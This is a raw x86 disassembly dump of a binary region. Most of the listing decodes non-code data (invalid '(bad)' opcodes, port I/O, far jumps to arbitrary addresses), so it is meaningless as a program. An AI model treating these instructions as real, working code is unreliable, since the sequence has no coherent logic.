  41fb83:	ins    DWORD PTR es:[edi],dx
  41fb84:	adc    DWORD PTR [esi],esp
  41fb86:	sbb    eax,0xa2c655af
  41fb8b:	xchg   ebp,eax
  41fb8c:	add    al,al
  41fb8e:	dec    eax
  41fb8f:	test   eax,0x39e2d967
  41fb94:	push   0xc15459a3
  41fb99:	adc    edi,esi
  41fb9b:	out    0xd,al
  41fb9d:	dec    edi
  41fb9e:	imul   edi,DWORD PTR [edx+0x21],0xfffffff5
  41fba2:	or     al,0xf9
  41fba4:	mov    eax,ds:0xc8e14f5e
  41fba9:	jmp    0xd6de:0x9707c8e8
  41fbb0:	inc    esi
  41fbb1:	push   edx
  41fbb2:	xchg   esi,eax
  41fbb3:	out    dx,al
  41fbb4:	mov    ecx,ds
  41fbb6:	sub    cl,0xe0
  41fbb9:	lds    eax,FWORD PTR [ecx]
  41fbbb:	mov    dl,0x1e
  41fbbd:	icebp  
  41fbbe:	cmp    eax,0x939def
	...
  41fc33:	add    BYTE PTR [ecx-0xf],al
  41fc36:	(bad)
  41fc39:	hlt    
  41fc3a:	gs icebp 
  41fc3c:	push   edx
  41fc3d:	sub    eax,0xc07b8ad2
  41fc42:	add    ebx,ebp
  41fc44:	add    al,0x55
  41fc46:	add    DWORD PTR [eax],eax
  41fc48:	test   BYTE PTR [eax],0x0
  41fc4b:	add    BYTE PTR [esi+0x65],ch
  41fc4e:	pop    ebp
  41fc4f:	daa    
  41fc50:	add    ch,dh
  41fc52:	std    
  41fc53:	pop    edx
  41fc54:	test   BYTE PTR [edx-0x4e97fe56],bh
  41fc5a:	icebp  
  41fc5b:	push   0x70
  41fc5d:	jmp    0x7d9b87d8
  41fc62:	loop   0x41fc7f
  41fc64:	clc    
  41fc65:	adc    cl,BYTE PTR [ebx]
  41fc67:	jns    0x41fc93
  41fc69:	pop    ds
  41fc6a:	ret    0xd3a9
  41fc6d:	jmp    0xfbe7:0xf34e5fb8
  41fc74:	mov    dl,BYTE PTR [eax-0x4756c155]
  41fc7a:	lods   al,BYTE PTR ds:[esi]
  41fc7b:	sbb    dl,bl
  41fc7d:	pop    ecx
  41fc7e:	ret    0xfb56
  41fc81:	test   al,0x3c
  41fc83:	mov    ah,0x53
  41fc85:	mov    esp,0x48fc4283
  41fc8a:	fild   QWORD PTR [ebp-0x32bc226d]
  41fc90:	in     eax,dx
  41fc91:	int3   
  41fc92:	cmp    eax,0xc77089ec
  41fc97:	pop    es
  41fc98:	fld    TBYTE PTR ds:0x427b6927
  41fc9e:	arpl   WORD PTR [edi-0x65d3d09a],di
  41fca4:	addr16 xchg edi,eax
  41fca6:	push   edx
  41fca7:	mov    ch,0x86
  41fca9:	fsub   DWORD PTR [ecx-0x79f1b6a7]
  41fcaf:	jg     0x41fd17
  41fcb1:	stos   BYTE PTR es:[edi],al
  41fcb2:	sti    
  41fcb3:	ficomp DWORD PTR [ecx]
  41fcb5:	mov    eax,ds:0xc722e2ff
  41fcba:	rol    eax,cl
  41fcbc:	adc    BYTE PTR [esp+edx*8+0xd3a4a35],dl
  41fcc3:	retf   0xbf36
  41fcc6:	xor    al,0x26
  41fcc8:	mov    ecx,0xc3d40466
  41fccd:	int3   
  41fcce:	ret    0x37d0
  41fcd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcd2:	or     al,BYTE PTR [ecx+0x234120e5]
  41fcd8:	inc    edi
  41fcd9:	xchg   ecx,eax
  41fcda:	cs push es
  41fcdc:	cs dec esp
  41fcde:	iret   
  41fcdf:	ret    
  41fce0:	scas   al,BYTE PTR es:[edi]
  41fce1:	jae    0x41fca4
  41fce3:	xchg   BYTE PTR [esi],bh
  41fce5:	adc    DWORD PTR [edi],eax
  41fce7:	and    ebx,DWORD PTR [eax-0x79f1b38b]
  41fced:	adc    DWORD PTR [eax+0x57f19a50],0xffffffb9
  41fcf4:	call   0x7cd6fdd3
  41fcf9:	outs   dx,BYTE PTR ds:[esi]
  41fcfa:	or     BYTE PTR ds:0x98047b6a,ah
  41fd00:	pushf  
  41fd01:	clc    
  41fd02:	bound  ebx,QWORD PTR [edx+0x28]
  41fd05:	std    
  41fd06:	inc    ebx
  41fd07:	mov    cl,0x36
  41fd09:	in     al,0x48
  41fd0b:	xchg   edi,eax
  41fd0c:	mov    al,ds:0x5532e939
  41fd11:	gs stos DWORD PTR es:[edi],eax
  41fd13:	clc    
  41fd14:	xor    BYTE PTR [ebx+0x4b1b1757],0x8c
  41fd1b:	dec    edx
  41fd1c:	mov    esi,0xa5a92b61
  41fd21:	or     BYTE PTR [esi+0x670775d4],bl
  41fd27:	sub    ecx,esi
  41fd29:	pop    edx
  41fd2a:	jns    0x41fdab
  41fd2c:	xchg   dl,bl
  41fd2e:	rol    BYTE PTR [edi],0xfb
  41fd31:	adc    ch,BYTE PTR [eax-0x2f]
  41fd34:	inc    edi
  41fd35:	mov    WORD PTR [esi-0x73ff5888],ds
  41fd3b:	je     0x41fd82
  41fd3d:	retf   
  41fd3e:	and    dh,BYTE PTR [edx+0xc241]
	...
  41fdb4:	add    eax,0x7b197956
  41fdb9:	aas    
  41fdba:	gs pop esi
  41fdbc:	repnz lahf 
  41fdbe:	and    al,0x2d
  41fdc0:	adc    ch,BYTE PTR [edx]
  41fdc2:	arpl   WORD PTR ds:0x155fa,di
  41fdc8:	test   BYTE PTR [eax],0x0
  41fdcb:	add    BYTE PTR [esi-0x45],bh
  41fdce:	shl    edx,1
  41fdd0:	lahf   
  41fdd1:	xor    bl,al
  41fdd3:	sbb    esp,DWORD PTR [edx-0x31]
  41fdd6:	pop    es
  41fdd7:	das    
  41fdd8:	test   eax,0x9330daab
  41fddd:	sub    edi,DWORD PTR [edx+0x66]
  41fde0:	sub    cx,WORD PTR [edi+0x72]
  41fde4:	pop    esp
  41fde5:	enter  0x9230,0xf5
  41fde9:	or     DWORD PTR [edi+ebp*8],esp
  41fdec:	xchg   edx,eax
  41fded:	sbb    DWORD PTR ds:[edx+0x10ed3644],ebp
  41fdf4:	add    esi,edx
  41fdf6:	imul   edx,edi,0xfe7afbde
  41fdfc:	pop    ebx
  41fdfd:	adc    al,0x2
  41fdff:	out    dx,eax
  41fe00:	cmp    BYTE PTR [ebp+0x6fe6219],0xa6
  41fe07:	or     ah,BYTE PTR [ecx-0x351ce106]
  41fe0d:	jmp    0x4341:0x9954196a
  41fe14:	pop    es
  41fe15:	(bad)  
  41fe16:	mul    DWORD PTR [edx+0x76]
  41fe19:	adc    al,0x32
  41fe1b:	adc    DWORD PTR [ebx],ebx
  41fe1d:	loope  0x41fdf3
  41fe1f:	xchg   BYTE PTR [esp+ebp*8-0x5f270857],bh
  41fe26:	pop    es
  41fe27:	call   FWORD PTR [ecx-0x3c]
  41fe2a:	dec    ebx
  41fe2b:	lods   eax,DWORD PTR ds:[esi]
  41fe2d:	push   eax
  41fe2e:	mov    eax,0xfca5a24c
  41fe33:	je     0x41fdfa
  41fe35:	xlat   BYTE PTR ds:[ebx]
  41fe36:	add    edi,DWORD PTR [edi+ebx*1+0x3e]
  41fe3a:	ret    
  41fe3b:	and    BYTE PTR [edx-0x33cad078],dh
  41fe41:	(bad)
  41fe44:	icebp  
  41fe45:	lods   al,BYTE PTR ds:[esi]
  41fe46:	mov    cl,0xce
  41fe48:	inc    DWORD PTR [esi-0xcc32ea4]
  41fe4e:	mov    edx,0x1ba89aa4
  41fe53:	dec    esi
  41fe54:	mov    esi,0x659cc6a5
  41fe59:	and    ecx,0xb14c0671
  41fe5f:	cmp    ecx,DWORD PTR [edx]
  41fe61:	and    BYTE PTR [ecx-0x64f6eacd],ch
  41fe67:	mov    ebp,0x44494855
  41fe6c:	xlat   BYTE PTR ds:[ebx]
  41fe6d:	sbb    dl,BYTE PTR [esi+esi*2]
  41fe70:	int3   
  41fe71:	cmp    esi,ebx
  41fe73:	mov    bl,0x68
  41fe75:	in     al,0x79
  41fe77:	mov    DWORD PTR [ecx+0x43697ac8],eax
  41fe7d:	loopne 0x41fefa
  41fe7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe80:	(bad)  
  41fe81:	pop    edx
  41fe82:	loopne 0x41fe1e
  41fe84:	xchg   ebp,eax
  41fe85:	cmc    
  41fe86:	jmp    0x41fecc
  41fe88:	mov    ch,0x89
  41fe8a:	aad    0x93
  41fe8c:	mov    dh,0xdd
  41fe8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe8f:	xchg   edx,eax
  41fe90:	add    DWORD PTR [ebx],esi
  41fe92:	arpl   WORD PTR [esi],di
  41fe94:	leave  
  41fe95:	or     al,0xa7
  41fe97:	cmc    
  41fe98:	cli    
  41fe99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe9a:	sub    ch,al
  41fe9c:	add    BYTE PTR [ebp-0x1fefc87e],dl
  41fea2:	rcl    BYTE PTR [esi-0x1a548b4c],0x7e
  41fea9:	xchg   ebp,eax
  41feaa:	xchg   ebx,eax
  41feab:	sar    BYTE PTR [eax-0x35],cl
  41feae:	push   0xffffff8c
  41feb0:	xor    ch,BYTE PTR [edi-0x7c]
  41feb3:	fsqrt  
  41feb5:	mov    edi,0x2fb4e20d
  41feba:	pop    esp
  41febb:	dec    edx
  41febc:	jnp    0x41ff2f
  41febe:	mov    ah,0x43
  41fec0:	sbb    BYTE PTR [edx+0x0],bl
	...
  41ff32:	add    BYTE PTR [eax],al
  41ff34:	mov    ecx,0xff25bf5d
  41ff39:	out    0xbb,eax
  41ff3b:	fisttp QWORD PTR [edi+0x7]
  41ff3e:	mov    WORD PTR [edi-0x36fb1ce3],?
  41ff44:	lock push esi
  41ff46:	add    DWORD PTR [eax],eax
  41ff48:	test   BYTE PTR [eax],0x0
  41ff4b:	add    BYTE PTR [esi+0x2f],ah
  41ff4e:	sub    BYTE PTR es:[esi+0xea99197],0x4d
  41ff56:	ror    ecx,cl
  41ff58:	cld    
  41ff59:	idiv   DWORD PTR [ebp+eiz*4-0x2d00a6f2]
  41ff60:	xlat   BYTE PTR ds:[ebx]
  41ff61:	shl    DWORD PTR [ebx+eiz*8-0x37],0x46
  41ff66:	fdiv   st,st(1)
  41ff68:	cs js  0x41ffcc
  41ff6b:	and    esi,DWORD PTR [edx+0x16040779]
  41ff71:	xor    BYTE PTR [edx+0xa],dl
  41ff74:	stos   BYTE PTR es:[edi],al
  41ff75:	lea    ecx,[esi-0x798be662]
  41ff7b:	cwde   
  41ff7c:	repz dec ecx
  41ff7e:	lods   eax,DWORD PTR ds:[esi]
  41ff7f:	jns    0x41ff6b
  41ff81:	int    0xd3
  41ff83:	xchg   edx,eax
  41ff84:	sbb    DWORD PTR [edi],esi
  41ff86:	push   es
  41ff87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff88:	sub    ch,BYTE PTR [esi-0x15996446]
  41ff8e:	xchg   edi,eax
  41ff8f:	(bad)  
  41ff90:	outs   dx,BYTE PTR ds:[esi]
  41ff91:	rol    BYTE PTR [edx],0x8
  41ff94:	xlat   BYTE PTR ds:[ebx]
  41ff95:	cli    
  41ff96:	in     al,0x95
  41ff98:	shl    DWORD PTR [edi],0x72
  41ff9b:	xlat   BYTE PTR ds:[ebx]
  41ff9c:	loopne 0x41ffb0
  41ff9e:	dec    edi
  41ff9f:	ds ja  0x41ff59
  41ffa2:	mov    dl,0x76
  41ffa4:	mov    cl,0xf3
  41ffa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffa7:	cs mov bl,ch
  41ffaa:	mov    dl,0x97
  41ffac:	lahf   
  41ffad:	add    eax,0xa9566372
  41ffb2:	xchg   ebp,eax
  41ffb3:	push   es
  41ffb4:	dec    ebx
  41ffb5:	cmp    eax,0xe6d28f8b
  41ffba:	jl     0x420032
  41ffbc:	mov    dh,0x14
  41ffbe:	aam    0x4e
  41ffc0:	das    
  41ffc1:	lahf   
  41ffc2:	mov    ds:0x187999eb,eax
  41ffc7:	mov    bl,bh
  41ffc9:	mov    ebx,?
  41ffcb:	and    eax,0xa3fcf8e6
  41ffd0:	fstp   DWORD PTR [ecx]
  41ffd2:	adc    DWORD PTR [edi-0x22a1dbd2],ecx
  41ffd8:	mov    ebx,0x415b9974
  41ffdd:	push   edx
  41ffde:	xchg   edi,eax
  41ffdf:	jo     0x42005e
  41ffe1:	cmp    eax,DWORD PTR [esp+esi*8-0x6399fc21]
  41ffe8:	test   al,0xb2
  41ffea:	clc    
  41ffeb:	scas   eax,DWORD PTR es:[edi]
  41ffec:	fidivr DWORD PTR [ecx]
  41ffee:	mov    edx,0xbd8bc43b
  41fff3:	sub    al,0xc7
  41fff5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fff6:	(bad)  
  41fff7:	push   ecx
  41fff8:	or     eax,ecx
  41fffa:	dec    ebp
  41fffb:	xor    al,0x41
  41fffd:	arpl   WORD PTR [ebp-0x52824d42],si
  420003:	xlat   BYTE PTR ds:[ebx]
  420004:	in     eax,0x91
  420006:	or     dl,dl
  420008:	lds    ecx,FWORD PTR ss:[edx+edx*2]
  42000c:	daa    
  42000d:	add    bh,BYTE PTR [edx+0x4eaa28c2]
  420013:	loope  0x42001a
  420015:	adc    al,0xa4
  420017:	mov    dl,0xd5
  42001a:	(bad)  
  42001b:	jge    0x420016
  42001d:	dec    esp
  42001e:	daa    
  42001f:	and    edx,DWORD PTR [esi-0x3d]
  420022:	push   0x63
  420024:	xor    al,0x1e
  420027:	push   edi
  420028:	xor    eax,0x605824f7
  42002d:	or     eax,0x449ded6c
  420032:	and    DWORD PTR [edi*8-0x29484e86],0x484600e7
  42003d:	cmp    edx,eax
  42003f:	or     cl,BYTE PTR [eax]
  420041:	pop    esi
	...
  4200b2:	add    BYTE PTR [eax],al
  4200b4:	fild   QWORD PTR [edx+ebp*1+0x6c]
  4200b9:	mov    ebx,0xe891ffdf
  4200be:	arpl   WORD PTR [eax-0x684b7765],ax
  4200c4:	out    0x57,al
  4200c6:	add    DWORD PTR [eax],eax
  4200c8:	test   BYTE PTR [eax],0x0
  4200cb:	add    dh,ch
  4200cd:	dec    esi
  4200ce:	ja     0x420113
  4200d0:	xor    edx,ebp
  4200d2:	repz jp 0x4200d8
  4200d5:	xchg   edx,eax
  4200d6:	push   es
  4200d7:	mov    bh,0xb9
  4200d9:	ror    BYTE PTR [esi-0x7e],0x29
  4200dd:	xchg   ebp,eax
  4200de:	arpl   WORD PTR [esi+eiz*4],ax
  4200e1:	fsub   DWORD PTR [ebx]
  4200e3:	fbstp  TBYTE PTR [ebx+eiz*2-0x1b]
  4200e7:	lods   eax,DWORD PTR ds:[esi]
  4200e8:	(bad)  
  4200e9:	(bad)  
  4200ea:	dec    edi
  4200eb:	mov    eax,ds:0xb0b4de76
  4200f0:	retf   0xbe82
  4200f3:	adc    eax,edi
  4200f5:	dec    eax
  4200f6:	sub    esp,ebx
  4200f8:	into   
  4200f9:	test   BYTE PTR [edx+0x1d],bh
  4200fc:	sub    DWORD PTR [ebp+0x584292d],esi
  420102:	adc    DWORD PTR [esi-0x75f6c0f9],esi
  420108:	std    
  420109:	out    0xf,eax
  42010b:	stos   DWORD PTR es:[edi],eax
  42010c:	xchg   ebp,eax
  42010d:	push   cs
  42010e:	fidiv  DWORD PTR [ebp-0x56]
  420111:	mov    al,ds:0x5665603
  420116:	xchg   edx,eax
  420117:	mov    ebp,0x82cf0b36
  42011c:	xor    BYTE PTR [ecx],dl
  42011e:	mov    eax,DWORD PTR [esi+0x69]
  420121:	add    BYTE PTR [ebx+0x22],cl
  420124:	mov    ebp,0x6544aaba
  420129:	inc    ebp
  42012a:	retf   0xe00f
  42012d:	test   DWORD PTR ds:0x52b42b68,edx
  420133:	test   BYTE PTR [eax+0x5d],0x50
  420137:	xchg   ecx,eax
  420138:	aam    0x52
  42013a:	push   cs
  42013b:	sbb    ecx,DWORD PTR [esi+eax*2-0x14b04fe5]
  420142:	js     0x420179
  420144:	push   cs
  420145:	das    
  420146:	push   0xa6bbd837
  42014b:	mov    dh,0x6f
  42014d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42014e:	test   DWORD PTR [ecx],esi
  420150:	dec    esp
  420151:	and    BYTE PTR [edx-0x82ec6bd],bh
  420157:	pop    ebx
  420158:	mov    edi,0x2809e814
  42015d:	jno    0x420187
  42015f:	inc    ebp
  420160:	xor    eax,0x7d23aefd
  420165:	rol    BYTE PTR [esi+0x11],cl
  420168:	or     al,0x57
  42016a:	mov    esp,0xa3938a65
  42016f:	pop    ss
  420170:	or     edx,DWORD PTR [edi+0x1c5b6b0c]
  420176:	sbb    al,0xd
  420178:	sub    al,bl
  42017a:	inc    edx
  42017b:	lock jecxz 0x4201ce
  42017e:	push   esp
  42017f:	or     bl,BYTE PTR [ecx-0x75]
  420182:	and    al,0x7a
  420184:	mov    esp,0x7f0d82db
  420189:	lods   eax,DWORD PTR ds:[esi]
  42018a:	ficom  DWORD PTR [esi+0x5a8e514]
  420190:	and    al,0x41
  420192:	mov    ah,0x9d
  420194:	lea    ebx,[esi+0x306d63bd]
  42019a:	nop
  42019b:	or     dl,0x1
  42019e:	idiv   BYTE PTR [ecx+0x29]
  4201a1:	jle    0x4201a0
  4201a3:	mov    ds:0xed68037d,al
  4201a9:	enter  0x518c,0xd0
  4201ad:	jecxz  0x42017b
  4201af:	rcr    BYTE PTR [ecx],cl
  4201b1:	mov    ebx,0x600420db
  4201b6:	out    0x23,al
  4201b8:	push   eax
  4201b9:	push   edx
  4201ba:	mov    ecx,esi
  4201bc:	sub    edx,DWORD PTR [ebp-0x31]
  4201bf:	nop
  4201c0:	shl    BYTE PTR [eax+eax*1+0x0],cl
	...
  420234:	push   ecx
  420235:	sbb    edi,edi
  420237:	jmp    si
  42023a:	fnstcw WORD PTR [edi]
  42023c:	mov    DWORD PTR ds:0xfc9cd010,ebx
  420242:	mov    eax,ds:0x158dc2b
  420247:	add    dh,dh
  420249:	add    BYTE PTR [eax],al
  42024b:	add    BYTE PTR [edi+0xdf160c2],ah
  420251:	int    0xa4
  420253:	sbb    BYTE PTR [esi+eax*8],ah
  420256:	jmp    0x5452c9fc
  42025b:	out    0xe9,al
  42025d:	ja     0x42028c
  42025f:	ror    BYTE PTR [ebp+0x1b],cl
  420262:	mov    eax,ds:0x9ec9770c
  420267:	jb     0x4202a5
  420269:	sbb    BYTE PTR [edi-0x7a5dd5f2],dl
  42026f:	scas   al,BYTE PTR es:[edi]
  420270:	jo     0x4202bc
  420272:	cmp    bh,BYTE PTR [edi+ebp*2]
  420275:	pop    edi
  420276:	add    BYTE PTR [edi],ch
  420278:	jne    0x4202a3
  42027a:	cmp    al,BYTE PTR [ecx+ebx*1-0x3d63245b]
  420281:	mov    cl,0xe8
  420283:	mov    ds:0xac1d0c9f,al
  420288:	sub    BYTE PTR [ecx+esi*1-0x6a1b7e89],dl
  42028f:	and    al,0x3e
  420291:	xor    DWORD PTR [ecx-0x6d],eax
  420294:	es pop ds
  420296:	inc    ecx
  420297:	pop    ebp
  420298:	push   cs
  420299:	xlat   BYTE PTR ds:[ebx]
  42029a:	inc    edx
  42029b:	jmp    0xc14a7d6e
  4202a0:	ss aad 0x3
  4202a3:	stos   DWORD PTR es:[edi],eax
  4202a4:	add    al,0x36
  4202a6:	adc    edx,DWORD PTR [ebx-0x7e9075f3]
  4202ac:	jo     0x420266
  4202ae:	and    edi,ebx
  4202b0:	mov    ah,0xff
  4202b2:	mov    eax,0xeeb61bff
  4202b7:	push   cs
  4202b8:	in     al,0x5f
  4202ba:	mov    WORD PTR [eax+0x29],es
  4202bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202be:	repnz xchg esi,eax
  4202c0:	xchg   ebx,eax
  4202c1:	addr16 int3 
  4202c3:	loopne 0x420263
  4202c5:	xor    al,0x48
  4202c7:	sahf   
  4202c8:	out    0x98,al
  4202ca:	rcr    esi,cl
  4202cc:	xchg   esi,eax
  4202cd:	push   esp
  4202ce:	js     0x420275
  4202d0:	or     al,BYTE PTR [edi]
  4202d2:	arpl   WORD PTR [ecx+0x52],ax
  4202d5:	pop    esi
  4202d6:	and    bl,BYTE PTR [eax]
  4202d8:	lea    ebp,[edx-0x42ed6b1a]
  4202de:	pushf  
  4202df:	iret   
  4202e0:	sbb    BYTE PTR [ebx-0x3b],0xb2
  4202e4:	xchg   edx,eax
  4202e5:	test   al,0xb2
  4202e7:	lock popa 
  4202e9:	sbb    eax,0xe382bb52
  4202ee:	and    ecx,ebx
  4202f0:	mov    WORD PTR [eax+0x7e],ds
  4202f3:	scas   eax,DWORD PTR es:[edi]
  4202f4:	pop    ds
  4202f5:	rol    BYTE PTR [eax+0x40ee8001],cl
  4202fb:	retf   
  4202fc:	aam    0x5d
  4202fe:	in     al,0xec
  420300:	fild   WORD PTR [ecx-0x7a9bea59]
  420306:	pop    edx
  420307:	jb     0x420387
  420309:	(bad)  
  42030a:	aas    
  42030b:	test   BYTE PTR [ecx],bl
  42030d:	cmp    eax,0x8f4d850d
  420312:	jbe    0x42033d
  420314:	fcom   DWORD PTR fs:[ebx-0x6c]
  420318:	das    
  420319:	cmp    esp,DWORD PTR ds:0xe9b60a24
  42031f:	sahf   
  420320:	pop    ecx
  420321:	mov    bl,0xbf
  420323:	xchg   edi,eax
  420324:	cli    
  420325:	mov    dl,0x27
  420327:	stos   DWORD PTR es:[edi],eax
  420328:	(bad)  
  42032a:	add    BYTE PTR [eax],ah
  42032c:	aaa    
  42032d:	call   0x7f06:0xa19cde6e
  420334:	out    dx,al
  420335:	add    eax,0xe7d2c440
  42033a:	mov    ah,0x6b
  42033c:	out    0xda,eax
  42033e:	sbb    al,0x95
  420340:	icebp  
  420341:	ret    0x0
	...
  4203b4:	cmp    al,0xe7
  4203b6:	imul   ebp,edi,0xfffffffb
  4203b9:	out    dx,eax
  4203ba:	mov    esp,0x889a5af7
  4203bf:	arpl   WORD PTR [edi-0x2de6d4c5],bx
  4203c5:	pop    ecx
  4203c6:	add    DWORD PTR [eax],eax
  4203c8:	test   BYTE PTR [eax],0x0
  4203cb:	add    BYTE PTR [edi],ch
  4203cd:	jnp    0x4203db
  4203cf:	and    eax,0x8eb8dff9
  4203d4:	fidiv  DWORD PTR [esi-0x4167d3f4]
  4203da:	push   esp
  4203db:	adc    bl,dl
  4203dd:	mov    al,ds:0x29b3a572
  4203e2:	(bad)  [eax+edi*4]
  4203e5:	pop    eax
  4203e6:	cmp    BYTE PTR [ebx-0x6cbd4adc],ah
  4203ec:	fist   DWORD PTR [ebx+eiz*2+0x15]
  4203f0:	jae    0x42040a
  4203f2:	fld    DWORD PTR [ebx-0x6c]
  4203f5:	mov    ecx,0x9214fbbf
  4203fa:	pop    eax
  4203fb:	mov    esp,0x82d86c2a
  420400:	sbb    al,0x9e
  420402:	aaa    
  420403:	xor    ecx,esp
  420405:	in     al,0xfa
  420407:	aad    0xa5
  420409:	mov    eax,0xc9687e96
  42040e:	out    dx,eax
  42040f:	xchg   ebp,eax
  420410:	sub    cl,BYTE PTR gs:[edi-0x58]
  420414:	jnp    0x420415
  420416:	mov    ch,0xd8
  420418:	test   DWORD PTR [esi-0x26],ebx
  42041b:	xchg   esi,eax
  42041c:	jno    0x42045e
  42041e:	js     0x4203fc
  420420:	fiadd  DWORD PTR [ebx]
  420422:	xchg   DWORD PTR [edi+ebx*8-0x14cfc8c8],ebp
  420429:	retf   
  42042a:	out    dx,eax
  42042b:	scas   al,BYTE PTR es:[edi]
  42042c:	ja     0x4203b8
  42042e:	out    dx,al
  42042f:	pop    ebp
  420430:	leave  
  420431:	leave  
  420432:	or     al,0x3f
  420434:	das    
  420435:	mov    ebx,0x184193f1
  42043a:	pop    esi
  42043b:	sbb    BYTE PTR ds:0xa1c08dc7,dl
  420441:	ret    
  420442:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420443:	mov    WORD PTR [ebx+0x46c5552],gs
  420449:	out    dx,al
  42044a:	fldcw  WORD PTR [ebx]
  42044c:	int    0x35
  42044e:	fld    DWORD PTR [edi]
  420450:	jmp    0x420498
  420452:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420453:	mov    ecx,0xb291337d
  420458:	addr16 mov eax,0x94c9905b
  42045e:	mov    ebp,DWORD PTR [ebx-0x60]
  420461:	dec    esi
  420462:	adc    DWORD PTR [ebx-0x4d],esp
  420465:	mov    ?,WORD PTR ds:0xcc9253f1
  42046b:	push   0x8cff17b7
  420470:	stos   BYTE PTR es:[edi],al
  420471:	clc    
  420472:	imul   esp,DWORD PTR [esp+ebp*4-0x32fc956d],0x7fce871f
  42047d:	pop    esi
  42047e:	mov    bl,0x43
  420480:	ss jp  0x42046b
  420483:	mov    cl,0x21
  420485:	jmp    0x4223854b
  42048a:	mov    ds:0x55ca18d1,al
  42048f:	sub    eax,DWORD PTR [edi]
  420491:	retf   
  420492:	push   ebp
  420493:	repnz mov ecx,0x96c827ca
  420499:	(bad)  
  42049a:	out    dx,al
  42049b:	shl    DWORD PTR [ebx],0x15
  42049e:	ret    
  42049f:	scas   al,BYTE PTR es:[edi]
  4204a0:	xchg   esi,eax
  4204a1:	and    DWORD PTR [ecx+0x1b3370d6],edi
  4204a7:	ret    0x8727
  4204aa:	cmp    DWORD PTR [edi-0x17],ecx
  4204ad:	or     ah,BYTE PTR [edx]
  4204af:	add    BYTE PTR [edi+0x58],ch
  4204b2:	dec    eax
  4204b3:	push   0xffffff93
  4204b5:	and    bl,BYTE PTR [ecx]
  4204b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204b8:	push   ds
  4204b9:	jne    0x4204c2
  4204bb:	into   
  4204bc:	pop    edi
  4204bd:	xor    DWORD PTR [edx+0x61],esi
  4204c0:	mov    esp,0x1
	...
  420531:	add    BYTE PTR [eax],al
  420533:	add    BYTE PTR [eax+0x34],bh
  420536:	add    bh,bl
  420538:	dec    esi
  420539:	(bad)  
  42053a:	stc    
  42053b:	mov    bh,0x14
  42053d:	clc    
  42053e:	add    al,0xe1
  420540:	outs   dx,DWORD PTR ds:[esi]
  420541:	cmc    
  420542:	mov    fs,WORD PTR [eax+ecx*8]
  420545:	pop    edx
  420546:	add    DWORD PTR [eax],eax
  420548:	test   BYTE PTR [eax],0x0
  42054b:	add    BYTE PTR [ebx+0x74f0f73d],bl
  420551:	(bad)  
  420552:	scas   al,BYTE PTR es:[edi]
  420553:	dec    ecx
  420554:	ins    DWORD PTR es:[edi],dx
  420555:	daa    
  420556:	adc    ebx,DWORD PTR [ebp+0x70]
  420559:	jnp    0x4204e9
  42055b:	fistp  DWORD PTR ds:0x3793827c
  420561:	ret    0x271e
  420564:	xor    eax,0xc202fea1
  420569:	in     eax,dx
  42056a:	and    ebx,esi
  42056c:	test   eax,0xa852b88c
  420571:	jbe    0x4205ac
  420573:	and    ecx,DWORD PTR [edx]
  420575:	xlat   BYTE PTR ds:[ebx]
  420576:	xor    dl,BYTE PTR [eax]
  420578:	aaa    
  420579:	xor    edi,eax
  42057b:	fbstp  TBYTE PTR [ebx+0x364efd89]
  420581:	call   0xbfa5:0xa5a71518
  420588:	int3   
  420589:	push   es
  42058a:	test   edx,esp
  42058c:	fwait
  42058d:	imul   esi,DWORD PTR [eax+esi*4],0x943a5579
  420594:	mov    ah,0xd
  420596:	sbb    eax,0x4fa8dfd0
  42059b:	dec    esi
  42059c:	(bad)  
  42059d:	(bad)  
  42059e:	icebp  
  42059f:	lar    ebx,WORD PTR [esi]
  4205a2:	or     eax,0x2815d3ae
  4205a7:	jge    0x4205e1
  4205a9:	aas    
  4205aa:	test   BYTE PTR [edx+eax*8-0x6e50c382],dl
  4205b1:	pop    ds
  4205b2:	dec    edi
  4205b3:	mov    al,0x53
  4205b5:	cdq    
  4205b6:	inc    eax
  4205b7:	test   eax,0xc1ac6c62
  4205bc:	xchg   ebx,eax
  4205bd:	pop    ebx
  4205be:	jne    0x420558
  4205c0:	add    eax,0x4c87cb65
  4205c5:	mov    bh,0x76
  4205c7:	mov    ch,0xe8
  4205c9:	sub    al,bl
  4205cb:	sbb    al,bl
  4205cd:	inc    esp
  4205ce:	retf   
  4205cf:	xor    ebp,DWORD PTR [ecx+edi*4+0x54]
  4205d3:	push   eax
  4205d4:	mov    WORD PTR [ecx+0x6a],ds
  4205d7:	cdq    
  4205d8:	test   al,0x64
  4205da:	and    ebx,edi
  4205dc:	sub    ebx,edx
  4205de:	(bad)  
  4205e0:	and    eax,0x8b4f0bfc
  4205e5:	pop    edx
  4205e6:	push   eax
  4205e7:	adc    DWORD PTR [ebp-0x169708d5],edx
  4205ed:	mov    dl,0x5e
  4205ef:	inc    esp
  4205f0:	push   0x35
  4205f2:	int    0x38
  4205f4:	sti    
  4205f5:	(bad)
  4205f8:	stc    
  4205f9:	neg    BYTE PTR [edx-0x11]
  4205fc:	test   al,0xdc
  4205fe:	or     edx,0x24
  420601:	sub    eax,0xcde5f25f
  420606:	dec    ecx
  420607:	je     0x4205c3
  420609:	mov    al,0x7
  42060b:	int3   
  42060c:	pop    edx
  42060d:	mov    BYTE PTR [ebx],ch
  42060f:	and    ebx,edi
  420611:	loope  0x420605
  420613:	cmp    DWORD PTR [ebx],ecx
  420615:	cmp    BYTE PTR [esi-0x74],dh
  420618:	sbb    al,0x31
  42061a:	test   DWORD PTR [ecx-0x27],edx
  42061d:	sbb    eax,0xe9c18b71
  420622:	ret    0xc437
  420625:	sbb    BYTE PTR [esp+ebx*8-0xb],dh
  420629:	jmp    0x4205b5
  42062b:	or     DWORD PTR [edi+0x45],ebp
  42062e:	jmp    0xfb40:0x8942977d
  420635:	push   ebp
  420636:	stc    
  420637:	adc    BYTE PTR [ebp+edi*8-0x7b],cl
